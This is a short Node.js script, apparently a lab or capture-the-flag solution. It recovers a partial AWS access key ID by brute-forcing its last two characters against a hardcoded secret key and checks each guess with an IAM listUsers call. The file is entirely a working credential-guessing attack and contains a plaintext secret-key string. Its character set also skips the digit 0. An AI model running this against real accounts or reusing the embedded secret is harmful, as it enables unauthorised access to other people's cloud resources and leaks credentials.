const _ = require("lodash");

// https://docs.aws.amazon.com/sdk-for-javascript/v2/developer-guide/getting-started-nodejs.html
// https://docs.aws.amazon.com/sdk-for-javascript/v2/developer-guide/loading-node-credentials-shared.html
const AWS = require("aws-sdk");

const accessKeyBase = "AKIA2SR3ZZCIQ7LT5Q"; // missing last two chars XX
const secretKey = "wotwpfUVRMmhkRoGPfgxd69enU6e0lnLqwnvZjtg";

// Generate array of alphabet range A-Z
const alpha = _
  .range("A".charCodeAt(0), "Z".charCodeAt(0) + 1)
  .map(i =>
    String.fromCharCode(i)
  );
// Generate array of number range 0-9
const numeric = _.range(1, 10)
  .map(i => i.toString());
// Merge alphabet and numbers arrays
const alphanumeric = alpha.concat(numeric);

// Generate all possible keys for missing last two chars by looping and appending
const possibleKeys = [];
alphanumeric.forEach(i => {
  alphanumeric.forEach(j => {
    possibleKeys.push(accessKeyBase + i + j);
  });
});

console.log(`[*] Testing ${possibleKeys.length} possible combinations`);

// TEST for match on solutionArray[2]
// const solutionArray = ['AKIA2SR3ZZCIQ7LT5QVK', 'AKIA2SR3ZZCIQ7LT5QVL', 'AKIA2SR3ZZCIQ7LT5QVZ'];

// Promisify AWS IAM.listUsers()
// https://lavrton.com/javascript-loops-how-to-handle-async-await-6252dd3c795/
const testCredential = (key) => {
  return new Promise((resolve, reject) => {
    let credentials = new AWS.Credentials(key, secretKey, null);
    AWS.config.credentials = credentials;
    let iam = new AWS.IAM({ apiVersion: "2010-05-08" });

    iam.listUsers({}, function(err, data) {
      if (err) {
        // IAM.listUsers() will return error code InvalidClientTokenId
        if (err.code === "InvalidClientTokenId") {
          // console.log("[*] Failed: This is an invalid access key");
          resolve();
        } else {
          console.log(`[!] Found: The valid access key is ${key}`);
          resolve();
        }
        reject(err);
      } else {
        console.log(`[!] Found: The valid access key is ${key}`);
        resolve();
      }
    });
  });
};

// Run through possibleKeys array and test for credentials match
(async function () {
  for (const key of possibleKeys) {
    console.log(`[*] Testing possible key ${key}`);
    await testCredential(key);
  }
})();

//  listUsers(params = {}, callback) ⇒ AWS.Request
// https://docs.aws.amazon.com/AWSJavaScriptSDK/latest/AWS/IAM.html#listUsers-property
